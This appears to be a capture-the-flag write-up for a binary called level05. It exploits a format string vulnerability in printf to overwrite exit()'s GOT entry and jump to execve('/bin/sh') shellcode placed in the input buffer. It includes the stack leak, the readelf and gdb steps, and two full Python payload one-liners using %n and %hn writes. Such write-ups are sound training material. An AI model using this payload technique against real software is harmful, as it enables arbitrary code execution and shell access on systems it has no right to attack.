# level05
RELRO protection is disable  
Presumption: Overwrite the __Global Offset Table (GOT)__

## Step 1: Understand the program
1. The program reads 100 bytes from `stdin` with `fgets` and store it in a buffer of 100 bytes
2. The program iterates over the buffer, checks if the char is an uppercase and convert it to lowercase if true (useless)
3. The program prints the buffer with an unprotected printf. __This is a format string vulnerablity__
4. finally, the program exits with `exit(0)`


## Step 2
Leak the stack to find somethings interesting

```bash
$ ./level05 
aaaa %x %x %x %x %x %x %x %x %x %x %x %x
```
```console
aaaa 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 20782520 25207825
```

Yeah ! We have access to the buffer thanks to the the __10th__ specifer `%x`.


## Goal 
Replace the `exit()` relocation address in the GOT to target our shellcode instead


## Step 3

Find the __GOT__ entry of `exit()`
```bash
readelf -r level05 | grep exit
```
```console
080497e0  00000407 R_386_JUMP_SLOT   00000000   exit
```

The address of `exit()` is stored at `0x080497e0` in the __GOT__


## Step 4

Find the address where the buffer is stored, to ensure that when `exit()` is called, the program jump to the buffer intead of `exit()`

> Assuming we have put an exploit in the buffer

- break after `fgets`
- Enter multiple `A` to fill the buffer
```bash
(gdb) x/s $esp+40
0xffffd6a8:	 'A' <repeats 99 times>
```
buffer is at `0xffffd6a8` (4294956712 in decimal)

We need to print 4294956716 with printf. Use `%n` will write this number at the address specified by the 10th argument (int *)

> 4294956716 because shellcode is at buffer + 4


## Exploit
```bash
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "%4294956689d" + "%10$n"'; cat) | /home/users/level05/level05
```

4294956689 = 4294956716 - 27

> 27 is the number of charcaters ever printed

> It doesn't work because print `4294956689` characters is too much

## Necessary to optimize
```bash
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "%54925d" + "%10$hn" + "%10579d" + "%11$hn" '; cat) | /home/users/level05/level05
```

We want to write 4 bytes `ffffd6a8` at `0x080497e0`  
We can write two bytes at a time with `%hn`:
- `0xd6a8` at `0x080497e0`
- `0xffff` at `0x080497e2`

> %hn: h mean short. Used to write in a `int16_t *` instead of `int32_t *`